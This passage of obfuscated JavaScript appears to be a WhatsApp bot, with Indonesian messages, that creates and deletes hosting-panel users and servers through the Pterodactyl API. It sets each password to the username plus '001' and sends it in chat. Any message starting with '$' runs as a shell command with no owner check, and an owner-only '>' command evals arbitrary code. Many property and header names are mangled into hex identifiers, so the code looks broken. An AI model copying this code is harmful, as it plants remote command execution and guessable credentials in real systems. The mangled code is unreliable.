            _0x18344c: 0x1f4,
            _0x77ac7e: "80"
          };
          const _0x332f10 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x54f601 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x325049 + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x40cc88.id,
              "_0x54ce": parseInt(_0x2771b4),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x5dcb22,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x9c7cf,
              "_0x1da287": _0x332f10,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x26f21b)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x552538 = await _0x54f601.json();
          if (_0x552538._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x552538._0x3f542c[0], null, 2));
          }
        }
        break;
      case "5gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x12d539 = _0x288ff4.split(",");
          if (_0x12d539.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x2d4a88 = _0x12d539[0];
          let _0x3601c4 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x12d539[1] ? _0x12d539[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x854ae1 = global._0x69757;
          let _0xcdb60e = global.location;
          let _0x1524b3 = _0x2d4a88 + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x3601c4) {
            return;
          }
          let _0x36fcfc = _0x2d4a88 + "001";
          const _0x2075d6 = {
            email: _0x1524b3,
            username: _0x2d4a88,
            _0x377fa4: _0x2d4a88,
            _0x7b8227: _0x2d4a88,
            language: "en",
            password: _0x36fcfc
          };
          let _0xc38e7d = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x2075d6)
          });
          let _0x7cdc94 = await _0xc38e7d.json();
          if (_0x7cdc94._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x7cdc94._0x3f542c[0], null, 2));
          }
          let _0x1e9a67 = _0x7cdc94.attributes;
          let _0x1e115f = await fetch(domain + "/api/application/nests/5/eggs/" + _0x854ae1, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x1e9a67.id);
          let _0x242170 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1e9a67.username + "\n🔐 Password: " + _0x36fcfc + "\n🔗 Url: " + domain;
          const _0x1fc5b6 = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x197b2c = {
            image: _0x1fc5b6,
            caption: _0x242170
          };
          const _0x611017 = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x3601c4, _0x197b2c, _0x611017);
          let _0x5b4d6f = await _0x1e115f.json();
          let _0x41b87f = _0x5b4d6f.attributes._0x30673f;
          const _0x4e0a4f = {
            memory: "5024",
            _0x56747b: 0x0,
            _0x3c531b: "5024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "100"
          };
          const _0x421856 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x3def27 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x2d4a88 + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x1e9a67.id,
              "_0x54ce": parseInt(_0x854ae1),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x41b87f,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x4e0a4f,
              "_0x1da287": _0x421856,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0xcdb60e)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x2cce5d = await _0x3def27.json();
          if (_0x2cce5d._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x2cce5d._0x3f542c[0], null, 2));
          }
        }
        break;
      case "6gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x4c1a3b = _0x288ff4.split(",");
          if (_0x4c1a3b.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x237cf1 = _0x4c1a3b[0];
          let _0x292c3 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x4c1a3b[1] ? _0x4c1a3b[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x51e7a1 = global._0x69757;
          let _0x5c9ff3 = global.location;
          let _0x38ad85 = _0x237cf1 + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x292c3) {
            return;
          }
          let _0x1aea11 = _0x237cf1 + "001";
          const _0x34fc43 = {
            email: _0x38ad85,
            username: _0x237cf1,
            _0x377fa4: _0x237cf1,
            _0x7b8227: _0x237cf1,
            language: "en",
            password: _0x1aea11
          };
          let _0x307b19 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x34fc43)
          });
          let _0xa9f928 = await _0x307b19.json();
          if (_0xa9f928._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0xa9f928._0x3f542c[0], null, 2));
          }
          let _0x25e86b = _0xa9f928.attributes;
          let _0x11080f = await fetch(domain + "/api/application/nests/5/eggs/" + _0x51e7a1, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x25e86b.id);
          let _0x1e1135 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x25e86b.username + "\n🔐 Password: " + _0x1aea11 + "\n🔗 Url: " + domain;
          const _0x2920e4 = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x31cfe0 = {
            image: _0x2920e4,
            caption: _0x1e1135
          };
          const _0x23b945 = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x292c3, _0x31cfe0, _0x23b945);
          let _0x334801 = await _0x11080f.json();
          let _0x450ee2 = _0x334801.attributes._0x30673f;
          const _0x112d19 = {
            memory: "6024",
            _0x56747b: 0x0,
            _0x3c531b: "6024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "160"
          };
          const _0x1f6269 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x30beb2 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x237cf1 + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x25e86b.id,
              "_0x54ce": parseInt(_0x51e7a1),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x450ee2,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x112d19,
              "_0x1da287": _0x1f6269,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x5c9ff3)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x4df4de = await _0x30beb2.json();
          if (_0x4df4de._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x4df4de._0x3f542c[0], null, 2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x41651d = _0x288ff4.split(",");
          if (_0x41651d.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x273787 = _0x41651d[0];
          let _0x36c221 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x41651d[1] ? _0x41651d[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x57443b = global._0x69757;
          let _0x35cae1 = global.location;
          let _0x23d2d3 = _0x273787 + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x36c221) {
            return;
          }
          let _0x5b28c2 = _0x273787 + "001";
          const _0x27636b = {
            email: _0x23d2d3,
            username: _0x273787,
            _0x377fa4: _0x273787,
            _0x7b8227: _0x273787,
            language: "en",
            password: _0x5b28c2
          };
          let _0x471a82 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x27636b)
          });
          let _0x215e4f = await _0x471a82.json();
          if (_0x215e4f._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x215e4f._0x3f542c[0], null, 2));
          }
          let _0x2b360d = _0x215e4f.attributes;
          let _0x247815 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x57443b, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x2b360d.id);
          let _0x4f7b16 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x2b360d.username + "\n🔐 Password: " + _0x5b28c2 + "\n🔗 Url: " + domain;
          const _0x1f7b62 = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x3e6c13 = {
            image: _0x1f7b62,
            caption: _0x4f7b16
          };
          const _0x3c7902 = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x36c221, _0x3e6c13, _0x3c7902);
          let _0x5a16ff = await _0x247815.json();
          let _0xe4c607 = _0x5a16ff.attributes._0x30673f;
          const _0x51770e = {
            memory: "7024",
            _0x56747b: 0x0,
            _0x3c531b: "7024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "170"
          };
          const _0x439931 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x4f0277 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x273787 + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x2b360d.id,
              "_0x54ce": parseInt(_0x57443b),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0xe4c607,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x51770e,
              "_0x1da287": _0x439931,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x35cae1)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x42e62d = await _0x4f0277.json();
          if (_0x42e62d._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x42e62d._0x3f542c[0], null, 2));
          }
        }
        break;
      case "8gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x123418 = _0x288ff4.split(",");
          if (_0x123418.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x493f0c = _0x123418[0];
          let _0x57a39f = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x123418[1] ? _0x123418[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x41c362 = global._0x69757;
          let _0x4db264 = global.location;
          let _0x5a3873 = _0x493f0c + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x57a39f) {
            return;
          }
          let _0x48a124 = _0x493f0c + "001";
          const _0xdd1a26 = {
            email: _0x5a3873,
            username: _0x493f0c,
            _0x377fa4: _0x493f0c,
            _0x7b8227: _0x493f0c,
            language: "en",
            password: _0x48a124
          };
          let _0x465840 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0xdd1a26)
          });
          let _0x4988d1 = await _0x465840.json();
          if (_0x4988d1._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x4988d1._0x3f542c[0], null, 2));
          }
          let _0x273da0 = _0x4988d1.attributes;
          let _0x2c8176 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x41c362, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x273da0.id);
          let _0x2b1ea4 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x273da0.username + "\n🔐 Password: " + _0x48a124 + "\n🔗 Url: " + domain;
          const _0x5e7afb = {
            url: "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0xec0d63 = {
            image: _0x5e7afb,
            caption: _0x2b1ea4
          };
          const _0x4cdaaa = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x57a39f, _0xec0d63, _0x4cdaaa);
          let _0x487cd0 = await _0x2c8176.json();
          let _0x501e1b = _0x487cd0.attributes._0x30673f;
          const _0x30d134 = {
            memory: "8024",
            _0x56747b: 0x0,
            _0x3c531b: "8024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "180"
          };
          const _0x461ece = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x3ee849 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x493f0c + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x273da0.id,
              "_0x54ce": parseInt(_0x41c362),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x501e1b,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x30d134,
              "_0x1da287": _0x461ece,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x4db264)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x491cac = await _0x3ee849.json();
          if (_0x491cac._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x491cac._0x3f542c[0], null, 2));
          }
        }
        break;
      case "9gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x5e7730 = _0x288ff4.split(",");
          if (_0x5e7730.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x2f62bf = _0x5e7730[0];
          let _0x2d7627 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x5e7730[1] ? _0x5e7730[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x46ffcd = global._0x69757;
          let _0x142f37 = global.location;
          let _0x5e2f8f = _0x2f62bf + "zxv@sweetrabit.ml";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x2d7627) {
            return;
          }
          let _0x12644f = _0x2f62bf + "001";
          const _0x4b9537 = {
            email: _0x5e2f8f,
            username: _0x2f62bf,
            _0x377fa4: _0x2f62bf,
            _0x7b8227: _0x2f62bf,
            language: "en",
            password: _0x12644f
          };
          let _0x330d32 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x4b9537)
          });
          let _0x2cef25 = await _0x330d32.json();
          if (_0x2cef25._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x2cef25._0x3f542c[0], null, 2));
          }
          let _0x28e8ed = _0x2cef25.attributes;
          let _0xb32025 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x46ffcd, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x28e8ed.id);
          let _0x230744 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x28e8ed.username + "\n🔐 Password: " + _0x12644f + "\n🔗 Url: " + domain;
          const _0x465212 = {
            url: "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x414d72 = {
            image: _0x465212,
            caption: _0x230744
          };
          const _0x58393d = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x2d7627, _0x414d72, _0x58393d);
          let _0x31a91f = await _0xb32025.json();
          let _0x2be036 = _0x31a91f.attributes._0x30673f;
          const _0x2c7e16 = {
            memory: "9024",
            _0x56747b: 0x0,
            _0x3c531b: "9024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "190"
          };
          const _0x1a605c = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x4c4de6 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x2f62bf + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x28e8ed.id,
              "_0x54ce": parseInt(_0x46ffcd),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x2be036,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x2c7e16,
              "_0x1da287": _0x1a605c,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x142f37)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x2690ae = await _0x4c4de6.json();
          if (_0x2690ae._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x2690ae._0x3f542c[0], null, 2));
          }
        }
        break;
      case "unli":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x249bb1 = _0x288ff4.split(",");
          if (_0x249bb1.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x11486c = _0x249bb1[0];
          let _0x102e97 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x249bb1[1] ? _0x249bb1[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x3954da = global._0x69757;
          let _0x140dde = global.location;
          let _0x2b4098 = _0x11486c + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x102e97) {
            return;
          }
          let _0x51ad86 = _0x11486c + "001";
          const _0x5c05fb = {
            email: _0x2b4098,
            username: _0x11486c,
            _0x377fa4: _0x11486c,
            _0x7b8227: _0x11486c,
            language: "en",
            password: _0x51ad86
          };
          let _0x16db5c = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x5c05fb)
          });
          let _0x442fbd = await _0x16db5c.json();
          if (_0x442fbd._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x442fbd._0x3f542c[0], null, 2));
          }
          let _0x1b73dc = _0x442fbd.attributes;
          let _0x4151cd = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3954da, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x1b73dc.id);
          let _0x906778 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1b73dc.username + "\n🔐 Password: " + _0x51ad86 + "\n🔗 Url: " + domain;
          const _0x54ea16 = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x4e9ced = {
            image: _0x54ea16,
            caption: _0x906778
          };
          const _0x3e1b03 = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x102e97, _0x4e9ced, _0x3e1b03);
          let _0x2ac350 = await _0x4151cd.json();
          let _0x4a20eb = _0x2ac350.attributes._0x30673f;
          const _0x31d19a = {
            memory: "0",
            _0x56747b: 0x0,
            _0x3c531b: "0",
            _0x18344c: 0x1f4,
            _0x77ac7e: "0"
          };
          const _0x5a5588 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x3e1da8 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x11486c + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x1b73dc.id,
              "_0x54ce": parseInt(_0x3954da),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x4a20eb,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x31d19a,
              "_0x1da287": _0x5a5588,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x140dde)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x4fc1a9 = await _0x3e1da8.json();
          if (_0x4fc1a9._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x4fc1a9._0x3f542c[0], null, 2));
          }
        }
        break;
      case "listsrv":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x287f54 = _0x1671ca[0] ? _0x1671ca[0] : "1";
          let _0x38d352 = await fetch(domain + "/api/application/servers?page=" + _0x287f54, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          let _0x1aeee8 = await _0x38d352.json();
          let _0x4ad1a3 = _0x1aeee8.data;
          let _0x3ed7b5 = "Berikut adalah daftar server:\n\n";
          for (let _0x2c56b3 of _0x4ad1a3) {
            let _0x1488e7 = _0x2c56b3.attributes;
            let _0x321504 = await fetch(domain + "/api/client/servers/" + _0x1488e7.uuid.split`-`[0] + "/resources", {
              "method": "GET",
              "headers": {
                "_0x7065e4": "application/json",
                "_0x28533e": "application/json",
                "_0x2afbd6": "Bearer " + capikey
              }
            });
            let _0x11fe81 = await _0x321504.json();
            let _0xe8988e = _0x11fe81.attributes ? _0x11fe81.attributes._0x364a76 : _0x1488e7.status;
            _0x3ed7b5 += "ID Server: " + _0x1488e7.id + "\n";
            _0x3ed7b5 += "Nama Server: " + _0x1488e7.name + "\n";
            _0x3ed7b5 += "Status: " + _0xe8988e + "\n\n";
          }
          _0x3ed7b5 += "Halaman: " + _0x1aeee8._0x29a4c5._0x3da560._0x31af73 + "/" + _0x1aeee8._0x29a4c5._0x3da560._0x4480be + "\n";
          _0x3ed7b5 += "Total Server: " + _0x1aeee8._0x29a4c5._0x3da560.count;
          const _0x1cc190 = {
            text: _0x3ed7b5
          };
          await _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, _0x1cc190, {
            "_0x1b9bca": _0x516d4a
          });
          if (_0x1aeee8._0x29a4c5._0x3da560._0x31af73 < _0x1aeee8._0x29a4c5._0x3da560._0x4480be) {
            _0x105e8a("Gunakan perintah " + (_0x5999dc ? _0x5999dc : ".") + "listsrv " + (_0x1aeee8._0x29a4c5._0x3da560._0x31af73 + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "delsrv":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x1fa32a = _0x1671ca[0];
          if (!_0x1fa32a) {
            return _0x105e8a("ID nya mana?");
          }
          let _0x49f086 = await fetch(domain + "/api/application/servers/" + _0x1fa32a, {
            "method": "DELETE",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          const _0x1c805f = {
            _0x3f542c: null
          };
          let _0x4a4bae = _0x49f086.ok ? _0x1c805f : await _0x49f086.json();
          if (_0x4a4bae._0x3f542c) {
            return _0x105e8a("Server tidak ditemukan");
          }
          _0x105e8a("Berhasil minghapus Server.");
        }
        break;
      case "totalfitur":
        {
          ngaceng = fs._0x4fdcbb("./annas.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x54b2e0 => _0x54b2e0.match(/case '([^']+)'/)[1]);
          _0x105e8a(" *Haii " + _0x1d0560 + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + _0x19a7d6() + " Fitur*");
        }
        break;
      default:
    }
    if (_0x510a5e.startsWith("$")) {
      exec(_0x510a5e.slice(2), (_0x258eee, _0xc47499) => {
        if (_0x258eee) {
          return _0x105e8a(_0x258eee);
        }
        if (_0xc47499) {
          return _0x105e8a(_0xc47499);
        }
      });
    }
    if (_0x510a5e.startsWith(">")) {
      if (!_0x1ba836) {
        return _0x105e8a(mess.only.owner);
      }
      try {
        let _0x248c31 = await eval(_0x510a5e.slice(2));
        if (typeof _0x248c31 !== "string") {
          _0x248c31 = require('util')._0x1004fe(_0x248c31);
        }
        await _0x105e8a(_0x248c31);
      } catch (_0x5148f6) {
        _0x105e8a(String(_0x5148f6));
      }
    }
  } catch (_0x5548af) {
    console.log(_0x5548af);
    _0x799da7._0x2e9b2a(owner + "@s.whatsapp.net", {
      "text": '' + util.format(_0x5548af)
    });
  }
};
let _0x7577aa = require.resolve(__filename);
function _0x27e6(_0x5db8ec, _0x1f223b) {
  const _0x287ce8 = _0x433d();
  _0x27e6 = function (_0xfa8549, _0x24cc91) {
    _0xfa8549 = _0xfa8549 - 124;
    let _0x4a2650 = _0x287ce8[_0xfa8549];
    if (_0x27e6.IblHHw === undefined) {
      var _0x57447f = function (_0x31e13d) {
        let _0x36e222 = '';
        let _0x2cffa3 = '';
        let _0x4aa5f0 = _0x36e222 + _0x57447f;
        let _0x44d9e8 = 0;
        let _0x42f4e8;
        let _0xe08b99;
        for (let _0x1dcea9 = 0; _0xe08b99 = _0x31e13d.charAt(_0x1dcea9++); ~_0xe08b99 && (_0x42f4e8 = _0x44d9e8 % 4 ? _0x42f4e8 * 64 + _0xe08b99 : _0xe08b99, _0x44d9e8++ % 4) ? _0x36e222 += _0x4aa5f0.charCodeAt(_0x1dcea9 + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x42f4e8 >> (-2 * _0x44d9e8 & 6)) : _0x44d9e8 : 0) {
          _0xe08b99 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(_0xe08b99);
        }
